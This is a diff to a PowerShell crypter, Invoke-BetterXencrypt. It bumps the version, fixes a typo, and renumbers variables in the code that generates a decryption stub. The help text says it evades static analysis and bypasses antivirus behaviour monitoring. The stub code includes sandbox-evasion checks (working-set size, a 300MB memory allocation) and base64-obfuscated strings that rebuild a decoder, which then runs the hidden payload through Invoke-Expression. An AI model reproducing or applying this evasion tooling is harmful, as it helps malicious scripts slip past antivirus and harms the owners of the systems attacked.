@@ -29,7 +29,7 @@ function Invoke-BetterXencrypt {
      The output script is highly randomized in order to make static analysis even more difficut.
      It also lets you layer this recursively however many times you want in order to attempt to foil dynamic & heuristic detection.
      Not only that,Invoke-BetterXencrypt-ed script can bypass any behavior monitoring from AVs
-     Version : v1.2.0
+     Version : v1.2.1
     .PARAMETER InFile
     Specifies the script to encrypt.
     .PARAMETER OutFile
@@ -141,7 +141,7 @@ function Invoke-BetterXencrypt {
 
             $stub_template = ''
 
-            # some AV's Dynamic Analysys bypasses
+            # some AV's Dynamic Analysis bypasses
             $code_alternatives  = @()
             $code_alternatives += '${30} = (Get-Process -Id $PID | Select-Object Name,@{17}Name="WorkingSet";Expression={17}($_.ws / 1024kb){18}{18}).WorkingSet' + "`r`n"
             $code_alternatives += 'if (${30} -lt 250) {17} ${31} = "a" * 300MB {18}' + "`r`n"
@@ -247,18 +247,18 @@ function Invoke-BetterXencrypt {
             $code_alternatives += '${5}.Close()' + "`r`n"
             $code_alternatives += '${4}.Dispose()' + "`r`n"
             $code_alternatives += '${6}.Close()' + "`r`n"
-            $code_alternatives += '${30} = & ([scriptblock]::Create([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W1N5c3RlbS5UZXh0LkVuY29kaW5nXQ=="))))' + "`r`n"
-            $code_alternatives += '${31} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VVRGOA=="))' + "`r`n"
-            $code_alternatives += '${32} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9BcnJheQ=="))' + "`r`n"
-            $code_alternatives += '${33} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R2V0U3RyaW5n"))' + "`r`n"
-            $code_alternatives += '${8} = ${30}::${31}.${33}(${7}.${32}())' + "`r`n"
+            $code_alternatives += '${32} = & ([scriptblock]::Create([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W1N5c3RlbS5UZXh0LkVuY29kaW5nXQ=="))))' + "`r`n"
+            $code_alternatives += '${33} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VVRGOA=="))' + "`r`n"
+            $code_alternatives += '${34} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9BcnJheQ=="))' + "`r`n"
+            $code_alternatives += '${35} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R2V0U3RyaW5n"))' + "`r`n"
+            $code_alternatives += '${8} = ${32}::${33}.${35}(${7}.${34}())' + "`r`n"
             $stub_template += $code_alternatives -join ''
 
             $stub_template += ('Invoke-Expression','IEX' | Get-Random)+'(${8})' + "`r`n"
             
         
             # it's ugly, but it beats concatenating each value manually.
-            [string]$code = $stub_template -f $b64encryptedreversed, $b64key, (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), ("{"), ("}"), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var)
+            [string]$code = $stub_template -f $b64encryptedreversed, $b64key, (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), ("{"), ("}"), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var)
             $codebytes = [System.Text.Encoding]::UTF8.GetBytes($code)
         }
         Write-Output "[*] Writing '$($outfile)' ..."
